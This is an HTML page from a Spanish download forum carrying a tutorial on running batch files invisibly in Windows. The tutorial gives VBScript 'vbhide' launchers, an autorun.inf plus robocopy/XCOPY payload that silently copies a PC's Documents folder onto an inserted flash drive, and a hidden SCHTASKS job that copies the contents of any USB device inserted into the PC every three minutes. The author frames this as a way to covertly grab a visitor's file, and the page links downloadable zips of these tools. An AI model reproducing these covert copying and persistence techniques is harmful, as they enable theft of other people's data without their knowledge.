@@ -1,0 +1,471 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//ES" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="https://www.w3.org/1999/xhtml" lang="es" xml:lang="es" >
+<head>
+<base href="https://identi.io/">
+<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+<title>Como ejecutar archivos batch de forma invisible - Identi</title>
+<meta http-equiv="content-type" content="application/xhtml+xml; charset=UTF-8"/>
+<meta name="referrer" content="always">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="msvalidate.01" content="C5D8F90264E49CBCC53E16C4A4783DB0" />
+<meta name="p:domain_verify" content="2ce1158220194154bfc7925e0aa151f2"/>
+<meta name="keywords" content="Identi, Mega, Copiapop, Zippyshare, Mediafire, Descargas, Gratis, Identili, Full, serial, completo, programas, antivirus, seriales, licencias, peliculas, series, android, iphone, Links, Descarga Mega, Descargar Gratis, pelis24, cuevana" /><meta name="description" content="Como ejecutar archivos batch y comandos de forma invisible y ocultos Crear aplicaciones en lenguaje MSDOS, que al ser ejecutadas por el usuario no muestren la famosa pantalla negra, o sea que las inst..." /><link rel="stylesheet" type="text/css" href="/css/identix1.css?v=1.1"/><link rel="stylesheet" type="text/css" href="/css/jquery-ui.css"/><script type="text/javascript">
+var global = {
+noavatar : "https://identi.io//images/def/avatar.png",
+images_dir : "https://identi.io/Themes/Identiz/images",
+scripturl : "https://identi.io/index.php",
+is_logged : false,
+boardurl : "https://identi.io",
+images_url : "https://identi.io/Themes/Identiz/images",
+id_member: "0",
+sources_directorio : "https://identi.io/Sources",
+pauth: 0,
+simg:new RegExp(),
+sdown:new RegExp(),
+slinks:new RegExp()}
+</script>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-GXW04CWGVY"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-GXW04CWGVY');
+</script>
+<script type="text/javascript" src="/js/jquery.1.7.min.js"></script><script src='https://www.google.com/recaptcha/api.js?render=6Le3g7IUAAAAANx7-80AckUlqLrX8tA1JIneAIEE'></script><script>var guest=true;</script><script type="text/javascript" src="/dev/developstone.js?99" defer="defer"></script>
+<script type="text/javascript">var approval = true;</script>
+<script type="text/javascript" src="/js/adframe.js?v=1" defer="defer"></script>
+<script type="text/javascript" src="/js/jquery-ui-1.8.23.custom.min.js" defer="defer"></script>
+<script type="text/javascript" src="/js/lazy.js?v=1.2" defer="defer"></script>
+<script type="text/javascript" src="/js/aes/aes2.min.js" defer="defer"></script>
+<script type="text/javascript" src="/js/acciones.js?v=13"></script>			<script>
+				var tokens='YUpzMEJEaDIxWGREN1NDVTJGc2RHVmtYMStEeWhKSHJmUE1EMUNuL0NJVnhHYStiOWMzS0MzQ2ZVcEp5SEJWWHF0a3FCekwzT3J3M0d1WEVtSkNxZG9TN1Y5REpRNWlGR28vNXc9PVlad3poMXdoUnhnZm9NSA==';
+			</script>
+			<script type="text/javascript" src="/js/display15.js?v=70"></script>		<script>
+function loadReca(obj){
+toopen = obj.attr('toopen');
+checkf = obj.parent().find('.spoiler-btn');
+placeT = obj.parent().find('.info_bbc');
+if(toopen != 'jd'){
+linkG = placeT.html();} else {
+linkG = obj.parent().find('.myjdownloader').attr('datacr');}
+captchaT = obj.attr('captchaID');
+$.ajax({
+url: '/ajax/recaptcha.php',
+data: 'response='+grecaptcha.getResponse(window[captchaT])+'&link='+encodeURIComponent(linkG)+'&type='+toopen,
+type: 'POST',
+success: function(h){
+if(h.charAt(0) != '0'){
+obj.hide();
+obj.parent().find('.in-reca').hide();
+if(toopen == 'spoiler'){
+placeT.html(h);
+checkf.show();} else {
+obj.parent().find('.myjdownloader').show();
+obj.parent().find('.myjdownloader').attr('href', obj.parent().find('.myjdownloader').attr('href')+h);}}}});}
+</script>
+<script data-cfasync="true" id="mensiones_tmp" type="text/html">
+<div class="tooltip-c compact clearfix">
+<span class="pick"></span>
+<div class="clearfix data-tip">
+<a href="?action=profile;user=<%= name %>" class="avatar-tip"><img id="error_avatar" alt="imagen avatar identi" width="50" height="50" src="<%= avatar %>"></a>
+<div class="user-tip">
+<a class="nick" href="https://identi.io/index.php?action=profile;user=<%=name%>"><%= name %></a>
+<img alt="hombre o mejor identi" src="/images/<%= sexo %>.png" /> <img alt="pais" src="/images/paises/16/<%= pais %>.png"/>
+<span class="trango"> <%= rango %> </span>
+</div>
+</div>
+<div class="view-more"><a>M&aacute;s informaci&oacute;n</a></div>
+</div>
+<div class="tooltip-c extended clearfix" style="word-wrap:break-word; overflow:hidden">
+<span class="pick"></span>
+<div class="clearfix data-tip">
+<a href="?action=profile;user=<%= name %>" class="avatar-tip"><img alt="identi avatar 2" id="errora_avatar" width="50" height="50" src="<%= avatar %>"></a>
+<div class="user-tip">
+<a class="nick" href="https://identi.io/index.php?action=profile;user=<%= name %>"><%= name %></a>
+<img alt="m o f identi.io" src="/images/<%= sexo %>.png" /> <img alt="nacionalidad" src="/images/paises/16/<%= pais %>.png" /> <span class="trango"> <%= rango %> </span>
+</div>
+</div>
+<div class="more-data">
+<b><%= posts %> Posts</b>
+<b><%= pts %> Puntos</b>
+<span><%= personalText %></span>
+</div>
+<div class="view-more">
+</div>
+</div>
+</script>
+<script type="text/javascript">
+var RecaptchaOptions = {
+theme : 'clean',
+lang : 'es'}
+dialog_conf = {
+autoOpen: false,
+width: 300,
+modal: true,
+resizable: false,
+draggable: false,
+buttons: [{
+text: "Ok",
+"class": 'floatR',
+click: function() {
+$(this).dialog("close");}}]}
+$(document).ready(function(){
+$('#my-dialog, #vprevia, #ui-alert').dialog(dialog_conf);
+timelib.current = 1761481387;
+timelib.upd();});
+</script>
+<script type="text/javascript"><!--
+   if(top.location!=this.location) top.location=this.location;
+   //--></script>
+</head>
+<body>
+<div id="mask" style="display:none;"></div>
+<div id="mydialog" style="display:none;"></div>
+<div id="my-dialog" style="display:none;"></div>
+<div id="ui-alert" style="display:none;"></div>
+<div id="mypopup" style="display: none;"></div>
+<span id="scroll-up" style="display: none; "></span>
+<div class="tooltip-anonimo clearfix box-shadow-soft" style="display: none;">
+<span class="pico"></span>
+<p><b>&Uacute;nete a Identi!</b></p>
+<p>Esta acci&oacute;n es s&oacute;lo para usuarios de Identi</p>
+<button onclick="./index.php?action=registrarse" class="ui-button-positive">Reg&iacute;strate</button>
+<button onclick="./index.php?action=login" >Ya tienes una cuenta?</button>
+</div>
+<div class="menu">
+<div class="bar clearfix">
+<ol class="menuTabs">
+<li class="tabbed">
+<a href="https://www.identi.io/index.php?cat=23" title="Peliculas en Espa&ntilde;ol latino">Peliculas</a>
+</li>
+<li class="tabbed">
+<a href="https://www.identi.io/index.php?cat=45" title="Series en Espa&ntilde;ol latino">Series</a>
+</li>
+<li class="tabbed">
+<a href="https://www.identi.io/index.php?cat=11" title="Juegos para PC">Juegos PC</a>
+</li><li class="tabbed  registrate"><a style="color:#01DF01" href="https://www.identi.io/index.php?action=registrarse">Registrate</a></li></ol>
+<div class="opciones_usuario anonimo">
+<div class="identificarme">
+	<a class="iniciar_sesion" id="login_button">Accede
+	<span class="logintab_overlay" style="display:none">Accede</span>
+	</a>
+</div>
+<div id="main_login">
+<div class="tabs">
+<ul class="clearfix"><li id="login_close" onclick="close_login()"></li></ul>
+
+<div class="login_cuerpo">
+
+ <div class="login_form">
+    <form action="https://identi.io/index.php?action=login2" method="post" accept-charset="ISO-8859-1" name="frmLogin" id="frmLogin" onsubmit="hashLoginPassword(this, '4308c7911d90892c5a53e6d209cf74ba');"><label></label>
+      <input maxlength="64" id="user" name="user" class="login_mf " placeholder="Email o Usuario" type="text">
+      <label>
+      <input maxlength="64" id="passwrd" name="passwrd" class="login_mf " placeholder="Contrase&ntilde;a" type="password">
+      </label>
+<a href="https://www.identi.io" onMouseDown="return contrasena(this);">Olvidaste tu contrase&ntilde;a?</a>
+	    <!----<input type="checkbox" id="login_remember"/> <p id="login_remember_p">Recordarme</p>--->
+   <input class="primary-mf-button" type="submit" value="Acceder a Identi"/>
+    <input class="secondary-mf-button" onclick="location.href='https://identi.io/index.php?action=registrarse'" type="button" value="Crear un usuario"/>
+    </form>
+	</div>
+	</div>
+  </div>
+</div>
+	</div></div></div>
+<div style="background: #004CA0 url(/images/head/head_5.png) repeat-x;" class="art-Header-gif">
+<div class="art-Header">
+<div class="art-Logo">
+<div id="logo">
+<a href="https://identi.io" title="Identi - Descargar Peliculas, Juegos, Series..." id="logo-img">
+<img src="/images/espacio.png" width="1" height="16" alt="Identi - Como ejecutar archivos batch de forma invisible" title="Identi - Como ejecutar archivos batch de forma invisible" align="top" border="0"/></a>
+</div>
+</div>
+
+</div>
+</div>
+</div>
+<div id="art-main">
+<div class="art-Sheet"><div class="subMenuContent">
+<div class="subMenu clearfix" id="subMenuPosts">
+<ul class="floatL clearfix tabsMenu">
+<li  class="here"  ><a  href="https://identi.io" title="Post de Inicio - Identi"><i class="sprite_i inicio"></i><img src="/images/espacios.png" alt="identi" width="4" height="1" />Posts</a></li>
+<li><a href="https://identi.io/index.php?action=comunidades" title="Entra y participa..."><i class="sprite_i comunidades"></i><img src="/images/espacios.png" alt="descargar peliculas" width="4" height="1" />Comunidades</a></li><li> <a href="https://identi.io/index.php?action=TOPs" title="Ranking"><i class="sprite_i top"></i><img src="/images/espacios.png" alt="peliculas identi" width="4" height="1" />Tops</a></li>
+<li><a href="https://identi.io/index.php?action=buscador" rel="search" title="Busca en Identi un post o tema..."><i class="sprite_i busqueda"></i><img src="/images/espacios.png" alt="programas" width="4" height="1" />Buscador</a></li></ul>
+<div class="fb-like" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
+<div class="search_top" id="search">
+<form id="ajaxSearch_form" action="https://identi.io/index.php?action=buscador" method="post" accept-charset="UTF-8">
+<input placeholder="Buscar..." id="searchbar" type="text" name="search" />
+<input id="searchbtn" type="submit" value=""/>
+</form>
+</div>
+</div></div>
+<div class="art-Sheet-body">
+<div class="div_control"><style>
+.linkhidder {
+    padding: 8px;
+    font-size: 14px!important;
+    border-radius: 3px;
+    font-weight: bold;
+    border: 1px solid #68B4F1;
+    color: #096FDB!important;
+    position: relative;
+    box-sizing: border-box;
+    cursor: pointer;
+    outline: none!important;
+}
+.linkhidder:before {
+    content: '';
+    position: absolute;
+    top: 0px;
+    left: 0px;
+    width: 0px;
+    height: 42px;
+}
+.linkhidder:hover:before {
+ width: 100%;
+}
+</style>
+<script>
+var hash = 'a10674457dbd9abb4e9f2eb75b8be35fe310a113';
+
+$(document).ready(function(){
+comments.hideQuotes();
+comments.iconsHover();
+$('.com_opt a').tipsy({fade: true,gravity:'s'});});
+</script>
+<div class="display_izq_col">
+<div class="display_sidebar clearfix">
+<div class="nick_sidebar clearfix">
+<a rel="nofollow" href="?action=profile;user=Maverick00">Maverick00</a>
+<a title="Desconectado" class="addtipsy_s offline"></a></div>
+<div class="sidebar_superior clearfix">
+<div class="avatar_sidebar">
+<a rel="nofollow" href="?action=profile;user=Maverick00" title="Ir al Perfil de Maverick00"><img id="error_avatar" class="avatar" border="0" width="120" src="https://subefotos.com/ver/?c35a36b842c01214775a4d46f35091f7o.jpg"/></a>
+<div class=" rango_sidebar clearfix">Idento</div>
+</div>
+<div class="sidebar_right">
+<div class="extra"><img class="addtipsy_s" title="" src="/images/paises/24/mx.png" /><img class="addtipsy_s" src="/images/male.png" title="Masculino" width="24" height="24" border="0" /><img class="addtipsy_s" width="32" height="32" src="/images/rangos/idento.png" title="Idento" border="0" />
+</div>
+</div>
+</div><div class="clearfix">
+<div class="clearfix boton_seguir">
+<span class="button require-login " accion="seguir" id="seguir" onclick="seguir.user(1938125)"  >Seguir Usuario</span>
+</div>
+<div class="clearfix boton_MP">
+<span class="button enviar_mp addtipsy_s require-login" onclick="javascript:mp.enviar_mensaje('1938125');" title="Enviar Mensaje Privado (Desconectado)"><i class="ui-icon ui-icon-mail-closed"></i>MP</span>
+</div>
+</div>
+<div class="sidebar_inferior clearfix">
+<span class="clearfix stats">
+<ul class="floatL">
+<li><b id="num_seguir">27</b> Seguidores</li>
+<li><b>642</b> Puntos</li></ul>
+<ul class="floatR">
+<li><b>22</b> Posts</li>
+<li><b>127</b> Comentarios</li>
+</ul>
+</span>
+
+</div></div>
+</div>
+<div class="display_der_col"><div class="header_post clearfix" >
+<h1 class="title_post">Como ejecutar archivos batch de forma invisible</h1>
+<div class="botones">
+<ul id="icons" class="ui-widget ui-helper-clearfix">
+<li onclick="location.href='https://identi.io/index.php?topic=414426';" class="ui-state-default ui-corner-all" title="Post Anterior" ><span class="ui-icon ui-icon-triangle-1-w"></span></li>
+<li onclick="location.href='https://identi.io/index.php?topic=414428';" class="ui-state-default ui-corner-all" title="Siguiente Post"><span class="ui-icon ui-icon-triangle-1-e"></span></li>
+</ul>
+</div>
+</div>
+<div class="extra_info clearfix">
+<ul>
+<li class="floatL"><!--sse-->Categor&iacute;a: <a href="https://identi.io/index.php?cat=74" alt="Tutoriales / Cursos" title="Tutoriales / Cursos">Tutoriales / Cursos</a><!--/sse--></li>
+<li class="floatR">Publicado  hace m&aacute;s de 9 a&ntilde;os </li>
+</ul>
+</div>
+<div class="post_body" id="post_1076455">
+<div style="width:728px; margin: -10px 0 10px -15px;" class="clearfix"></div><script type="text/javascript">var onloadCallback = function() {};</script><span style="color: #0c95c9;"><font size="5" style="line-height: 1.3em;"><span style="font-family: Trebuchet MS, Georgia, Times New Roman, Times, serif;">Como ejecutar archivos batch y comandos de forma invisible y ocultos</span></font></span><br /><br /><br /><span style="color: #000000;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Segoe UI, Verdana;">Crear aplicaciones en lenguaje MSDOS, que al ser ejecutadas por el usuario no muestren la famosa pantalla negra, o sea que las instrucciones se transmitan de forma oculta, sin ninguna señal que indique que se está procesando una orden de la consola de CMD. Como copiar datos e información de forma automática de la computadora a dispositivos de almacenamiento USB y viceversa, solo al insertarlos en el equipo.<br />Se puede ejecutar en Windows cualquier archivo batch de forma oculta, silenciosa e invisible, de manera que no se muestre el proceso en la consola de CMD.<br />Para eso es necesario crear un script escrito en lenguaje VBScript, que sea el que llame y ejecute el archivo batch y lo ejecute de forma oculta.<br />Los scripts son sencillas aplicaciones auto ejecutables similares a los archivos batch, la diferencia es que contienen código escrito en lenguaje VBScript, una derivación del famoso Visual Basic de Microsoft.<br />Para crear uno de estos scripts, solo es necesario pegar el código necesario en el Bloc de notas de Windows y guardar el archivo con cualquier nombre, pero que tenga la extensión de archivo: .vbs, en vez de la tradicional: .txt<br /><br /><br /><br /><font size="5" style="line-height: 1.3em;"><span style="font-family: Trebuchet MS, Georgia, Times New Roman, Times, serif;">Crear un script para ejecutar un archivo batch de forma oculta</span></font><br />Para crear el script necesario copia el siguiente código en el Bloc de notas y guárdalo con la extensión .vbs.<br />Cambia &quot;archivo.cmd&quot;, por la ruta y el nombre del archivo batch que se desea ejecutar.<br />Como comprobaras en el código, la opción &quot;vbhide&quot; es la que hace que no se muestre la pantalla al ejecutarse el batch.<br /><span style="color: #000088;">set</span> objshell <span style="color: #666600;">=</span> createobject<span style="color: #666600;">(</span><span style="color: #008800;">&quot;wscript.shell&quot;</span><span style="color: #666600;">)</span><br />objshell<span style="color: #666600;">.</span>run <span style="color: #008800;">&quot;archivo.cmd&quot;</span><span style="color: #666600;">,</span>vbhide<br /><br /><br /><font size="4" style="line-height: 1.3em;"><span style="font-family: Trebuchet MS, Georgia, Times New Roman, Times, serif;">Archivo batch para copiar datos de dispositivos en unidades USB de forma oculta</span></font><br />Archivo batch que permite copiar de manera eficaz datos de cualquier dispositivo insertado en un puerto USB de la PC de forma oculta.<br />El método utilizado es un VBScript que al ejecutarlo llama al batch que hace la función de copia, este batch está diseñado de forma tal que automáticamente detecta en que unidad esta insertado el dispositivo y copia todo su contenido a una carpeta en tu PC, en este caso en la ruta D:COPIA.<br />Tanto el script como el batch se ejecutan de forma invisible por lo que todo el proceso es imperceptible.<br />El script tiene que estar en este caso en el mismo directorio que el batch, pero puedes crear un acceso directo y tenerlo por ejemplo en el escritorio.<br />En este caso el script ejecutará el copiador FLASHCopy.cmd por lo que al insertar cualquier memoria o disco duro USB en tu PC te permitirá con solo dos clics copiar su contenido de forma inadvertida.<br />Puedes descargar en el link más abajo un archivo que contiene FLASHCopy.cmd y el script, recuerda de tenerlos siempre en el mismo directorio.<br /><br /><font size="2" style="line-height: 1.3em;"><span style="font-family: Verdana;">Descarga en el siguiente vínculo el archivo que contienen los batch que se mencionan anteriormente, descomprímelos para poder usarlos. Estan incluidas las versiones para usarlo en Windows XP, Vista y 7</span></font><br /><br /><a href="https://norfipc.com/ftp/comandos/FLASHCopyHide.zip" target="_blank" rel="nofollow"><span style="color: #064f78;"><img id="img_post" src="https://norfipc.com/img/icon/down.png" border="0">Archivo batch para copiar datos de dispositivos flash usb de forma oculta</span></a><br /><br /></span></font></span><hr width="50%"><br /><br /><br /><font size="4" style="line-height: 1.3em;"><span style="font-family: Trebuchet MS, Georgia, Times New Roman, Times, serif;">Copiar datos de forma automática de la PC a la memoria flash</span></font><br />Es posible también hacer lo inverso, tener los archivos necesarios en la memoria flash para que al insertarla en una PC, de forma automática se copien al dispositivo los archivos que hayas especificado de antemano en el archivo batch, esto se logra creando un archivo autorun.inf que indica a Windows iniciar el script y este a su vez ejecuta el batch que realiza la copia, todo esto funciona de forma automática e imperceptible para el usuario.<br />El código del archivo batch puede ser como el siguiente, que hace la copia de la carpeta Mis Documentos a la carpeta DATOS en la memoria, solo cambia la ruta por la de tu conveniencia, cópialo al Bloc de notas y guárdalo como Rcopy.cmd:robocopy<span style="color: #666600;">.</span>exe <span style="color: #666600;">/</span>MIR <span style="color: #008800;">&quot;%userprofile%Documents&quot;</span> <span style="color: #666600;">%</span><span style="color: #006666;">1</span><span style="color: #666600;"></span>DATOS<span style="color: #008800;">&quot;</span>Si usas Windows XP y no has instalado robocopy.exe en tu sistema, entonces tendrás que utilizar en tu archivo batch el comando XCOPY como en el ejemplo siguiente:XCOPY <span style="color: #008800;">&quot;%userprofile%Documents&quot;</span> <span style="color: #666600;">%</span><span style="color: #006666;">1</span><span style="color: #666600;"></span>DATOS<span style="color: #008800;">&quot; /E /F /I /C /Y</span>Para hacer el archivo autorun.inf copia el siguiente código al Bloc de notas y guárdalo comoautorun.inf:<span style="color: #666600;">[</span><span style="color: #660066;">Autorun</span><span style="color: #666600;">]</span><span style="color: #660066;">Open</span><span style="color: #666600;">=</span> start<span style="color: #666600;">.</span>vbs<span style="color: #660066;">Icon</span><span style="color: #666600;">=</span>icons<span style="color: #666600;"></span>drive<span style="color: #666600;">.</span>ico<span style="color: #660066;">Label</span><span style="color: #666600;">=</span><span style="color: #660066;">Test</span><span style="color: #660066;">UseAutoPlay</span><span style="color: #666600;">=</span><span style="color: #006666;">1</span><br />action<span style="color: #666600;">=</span><span style="color: #660066;">Abrir</span> USBEl otro archivo a crear seria el script con el siguiente código, cópialo al Bloc de notas y guárdalo como start.vbs:<span style="color: #000088;">set</span> objshell <span style="color: #666600;">=</span> createobject<span style="color: #666600;">(</span><span style="color: #008800;">&quot;wscript.shell&quot;</span><span style="color: #666600;">)</span><br />objshell<span style="color: #666600;">.</span>run <span style="color: #008800;">&quot;binRcopy.cmd&quot;</span><span style="color: #666600;">,</span>vbhideLo siguiente es copiar start.vbs y autorun.inf a la raíz de la memoria y el batch Rcopy.cmd al interior de una carpeta nombrada bin. Listo, cuando insertes la memoria en otra PC copiará la carpeta en este caso Mis Documentos a la carpeta DATOS de tu memoria flash.<br /><br /><br /><br /><font size="4" style="line-height: 1.3em;"><span style="font-family: Trebuchet MS, Georgia, Times New Roman, Times, serif;">Como cancelar el proceso de cualquier copia en curso</span></font><br />Recuerda que en el proceso de copia no se mostrará ninguna ventana, por lo que si tienes que cancelar la copia solo podrás hacerlo mediante el Administrador de tareas.<br />También tienes la alternativa de utilizar un batch para cancelar el proceso, para eso créalo con el siguiente código:<span style="color: #006666;">@echo</span> off<br /><br />taskkill <span style="color: #666600;">/</span>f <span style="color: #666600;">/</span>IM robocopy<span style="color: #666600;">.</span>exe<br />taskkill <span style="color: #666600;">/</span>f <span style="color: #666600;">/</span>IM cmd<span style="color: #666600;">.</span>exePara Windows XP seria de la siguiente forma:<span style="color: #006666;">@echo</span> off<br /><br />taskkill <span style="color: #666600;">/</span>f <span style="color: #666600;">/</span>IM xcopy<span style="color: #666600;">.</span>exe<br />taskkill <span style="color: #666600;">/</span>f <span style="color: #666600;">/</span>IM cmd<span style="color: #666600;">.</span>exe<font size="2" style="line-height: 1.3em;"><span style="font-family: Verdana;">Descarga en el siguiente vínculo el archivo que contienen los archivos batch que se mencionan anteriormente, descomprímelos para poder usarlos. Estan incluidas las versiones para usarlo en Windows XP, Vista y 7</span></font><br /><br /><a href="https://norfipc.com/ftp/comandos/copiadores_ocultos.zip" target="_blank" rel="nofollow"><span style="color: #064f78;"><img id="img_post" src="https://norfipc.com/img/icon/down.png" border="0">Batch para copiar datos de forma automática de la PC a la memoria flash</span></a><br /><br /><br /><br /><font size="4" style="line-height: 1.3em;"><span style="font-family: Trebuchet MS, Georgia, Times New Roman, Times, serif;">La reproducción automática en Windows</span></font><br />? Los archivos batch anteriores solo funcionan si el equipo donde se introduce la memoria flash usa Windows XP.<br />? Si se tiene instalado Windows Vista, es necesario oprimir la tecla Enter, ya que será la primera opción que aparezca en el cuadro de Autoplay.<br />? En el caso de Windows 7 no funcionarán de ninguna manera ya que este sistema operativo tiene deshabilitada por completo la reproducción automática en medios extraíbles, solo es posible hacerlos funcionar, ejecutando el archivo que inicia la acción manualmente, en este caso el script &quot;start.vbs&quot;.<br /><hr width="50%"><br /><br /><font size="4" style="line-height: 1.3em;"><span style="font-family: Trebuchet MS, Georgia, Times New Roman, Times, serif;">Copiar datos de forma automática y oculta de una memoria USB a la PC o Notebook</span></font><br />En el artículo <a href="https://norfipc.com/comandos/hacer-backup-memoria-flash.html" target="_blank" rel="nofollow"><span style="color: #064f78;">Hacer backup o respaldo de datos en una memoria flash de forma automática</span></a>, se explica que en Vista y aún más en Windows 7 esta deshabilitada la reproducción automática en unidades extraíbles, por lo que es imposible utilizar el archivo <i>autorun.inf</i> para planificar la ejecución de ninguna tarea mediante un batch ni cualquier otro archivo.<br />En algunos casos es viable mediante la línea de comandos programar una tarea que cada cierto tiempo ejecute el script que se vio en el primer caso, que verifica si hay algún dispositivo conectado en la PC y si es así copia su contenido a una carpeta nuestra de forma silenciosa e invisible.<br />Para eso podemos utilizar el comando SCHTASKS.<br /><hr width="50%"><font size="4" style="line-height: 1.3em;"><span style="font-family: Trebuchet MS, Georgia, Times New Roman, Times, serif;">Utilizar el comando SCHTASKS para programar tareas</span></font><br />El comando SCHTASKS es creado para programar tareas en el equipo, con opciones más avanzadas de lo que permite el anterior comando AT, que todavía es posible de utilizar, pero solo en tareas sencillas.<br />SCHTASKS lista, crea, elimina o permite editar tareas programadas en el equipo.<br />Al usarlo sin parámetros muestra todas las tareas programadas en la PC, algunas que ni tenemos idea ya que las ordenan aplicaciones o el propio sistema sin enterarnos.<br />Usándolo con la opción /CREATE podemos planificar una acción, que es lo que se ordena en el siguiente archivo batch, ejecutar el script start.vbs cada 3 minutos.<br /><hr width="50%"><font size="4" style="line-height: 1.3em;"><span style="font-family: Trebuchet MS, Georgia, Times New Roman, Times, serif;">Usos prácticos del comando SCHTASKS</span></font><br />El siguiente batch hubo necesidad de crearlo y probarlo en solo cinco minutos, en una emergencia real de un caso de una persona allegada que esperaba a alguien (conocedor de informática y difícil de distraer), que venía a hacer una labor en su PC y tenía en su memoria flash un documento que le era muy necesario, pero que no iba a poder estar cerca ni en los alrededores de dicha PC.<br />En este caso se utiliza el siguiente batch llamado <i>run.cmd</i><span style="color: #006666;">@echo</span> off<br />SCHTASKS <span style="color: #666600;">/</span>create <span style="color: #666600;">/</span>SC MINUTE <span style="color: #666600;">/</span>MO <span style="color: #006666;">3</span> <span style="color: #666600;">/</span>tn copiar <span style="color: #666600;">/</span>TR C<span style="color: #666600;">:</span><span style="color: #660066;">Hide</span><span style="color: #666600;"></span>start<span style="color: #666600;">.</span>vbs El archivo batch run.cmd ejecuta el comando SCHTASKS que crea una tarea programada para ejecutarse cada 3 minutos.<br />Dicha tarea es ejecutar el script start.vbs, el cual a su vez ejecuta de forma oculta el batch FLASHCopy.cmd que verifica si existe algún dispositivo extraíble conectado y si es así copia todo su contenido de manera imperceptible a la carpeta D:COPIA.<br />Las opciones usadas en este caso con SCHTASKS son las siguientes:<br />/SC MINUTE = Frecuencia de la programación<br />/MO Número de minutos<br />/tn = Nombre de la tarea<br />/TR = Ruta de acceso y el nombre de archivo del programa que se va a ejecutar<br />Si te interesa descarga un paquete con todos los archivos en el link más abajo.<br />Para usarlo copia la carpeta <i>Hide</i> a la unidad C. <br />Utilízalo con precaución, se adjunta un batch llamado <i>detener_tarea</i> para detener y eliminar la tarea creada, si no es así el script se mantendrá ejecutándose aunque reinicies el sistema y poco a poco te llenará el disco duro de datos que capture en las memorias o cualquier dispositivo USB insertado.<br />Puedes usar los siguientes comandos en la consola de CMD para verificar manualmente si la tarea se está ejecutando, para detenerla y eliminarla en ese mismo orden.<br /><br /><b>SCHTASKS /query /tn copiar <br />SCHTASKS /tn copiar /End<br />SCHTASKS /tn copiar /delete</b><br /><br /><a href="https://norfipc.com/ftp/comandos/hide.zip" target="_blank" rel="nofollow"><span style="color: #ff0000;"><img id="img_post" src="https://norfipc.com/img/icon/down.png" border="0">Archivo batch para copiar datos de forma automática y oculta de una memoria flash USB a la PC o Notebook</span></a>[/font][/size][/color]<script src="https://www.google.com/recaptcha/api.js?hl=es&onload=onloadCallback&render=explicit" async defer></script><div style="width:728px; margin: 10px 0 10px -15px;" class="clearfix"></div><center><a href="https://www.identi.io/">descargar peliculas</a> - <a href="https://www.identi.io/index.php?cat=25">descargar programas</a></center>
+<div id="tipsy_bottom">
+</div>
+</div>
+<div class="clearfix info_post">
+<div class="general_stats floatL">
+<div class="clearfix" style="margin:0 0 8px;">
+<span class="stats points" ><img width="16" height="16" src="/images/coins.png"> <b id="cant_pts_post">10</b> Puntos</span>
+<span class="stats"><img width="16" height="16" src="/images/if16.png"> Score:<b> 5/10</b></span>
+</div>
+<div class="clearfix">
+<span class="stats"><img width="16" height="16" src="/images/visitas.png"> Visitas: <b class="icons visitas">1557</b> </span>
+<span class="stats"><img width="16" height="16" src="/images/star.png"> Favoritos: <b class="icons fav" id="cant_favs_post">12</b> </span></div>
+</div><div class="floatR clearfix dar_puntos"><div class="clearfix" id="contenedor"><span class="titulo"> Califica este Post:</span><span><a class="puntos require-login pts-1" onclick="darpuntos.post(414427,1);return false"> 1 </a><a class="puntos require-login pts-2" onclick="darpuntos.post(414427,2);return false"> 2 </a><a class="puntos require-login pts-3" onclick="darpuntos.post(414427,3);return false"> 3 </a><a class="puntos require-login pts-4" onclick="darpuntos.post(414427,4);return false"> 4 </a><a class="puntos require-login pts-5" onclick="darpuntos.post(414427,5);return false"> 5 </a><a class="puntos require-login pts-6" onclick="darpuntos.post(414427,6);return false"> 6 </a><a class="puntos require-login pts-7" onclick="darpuntos.post(414427,7);return false"> 7 </a><a class="puntos require-login pts-8" onclick="darpuntos.post(414427,8);return false"> 8 </a><a class="puntos require-login pts-9" onclick="darpuntos.post(414427,9);return false"> 9 </a><a class="puntos require-login pts-gold" onclick="darpuntos.post(414427,10);return false"> 10 </a></span>
+</div></div></div><!---fin info post ---><div class="votaron"><span id="mostrar_lista" onclick="$('#lista').slideToggle('fast');">Ver los usuarios que votaron...</span>
+<span id="lista" style="display:none;" class="clearfix lista_votos" ">
+<ul><center><li><img id="error_avatar" src="http://i0.wp.com/simpleprogrammer.com/wp-content/uploads/2013/03/programmer.jpg" width="24" height="24"/><span class="text"> <a href="https://identi.io/index.php?action=profile;u=1895410" title="perfil de Jibge"> Jibge</a>: <b>5 pts</b></span>  </li><li><img id="error_avatar" src="https://2.bp.blogspot.com/_ierSNQX-XaE/SUUTV7QLbTI/AAAAAAAAAHo/mcjAJfly6xo/s320/Ryu.PNG" width="24" height="24" /><span class="text"> <a href="https://identi.io/index.php?action=profile;u=1616246" title="perfil de Hadoken1"> Hadoken1</a>: <b>5 pts</b></span>  </li></center></ul></span></div>
+<div class="clearfix opciones_post">
+<!---<div>Opciones </div>---><div class="clearfix interact_post">
+<span id="favs" class="button ui-favs require-login" onclick="favs.add(414427);">Agregar a Favoritos</span>
+<span  id="denun" class="button ui-flag require-login" title="Denunciar post" onclick="denunciar.post.load('414427');" >Denunciar</span>
+</div><div class="clearfix accion_post">
+</div>
+</div>
+<div class="clearfix sugerencias">
+<div class="clearfix sugerir-post floatL">
+<span class="titulo">M&aacute;s del Autor...</span>
+<ul class="zebra post_rel"><li class="clearfix">
+<span style="width:300px;" id="margen"><span id="over_fix">
+<i class="sprite icono_74"></i>
+<a href="https://identi.io/index.php?topic=423389" title="Recopilacion de archivos batch para Windows"> Recopilacion de archivos batch para Windows</a></span></span></li><li class="clearfix">
+<span style="width:300px;" id="margen"><span id="over_fix">
+<i class="sprite icono_74"></i>
+<a href="https://identi.io/index.php?topic=423373" title="Como crear particiones y dar formato a los discos "> Como crear particiones y dar formato a los discos </a></span></span></li><li class="clearfix">
+<span style="width:300px;" id="margen"><span id="over_fix">
+<i class="sprite icono_74"></i>
+<a href="https://identi.io/index.php?topic=423322" title="Usar la consola de CMD"> Usar la consola de CMD</a></span></span></li><li class="clearfix">
+<span style="width:300px;" id="margen"><span id="over_fix">
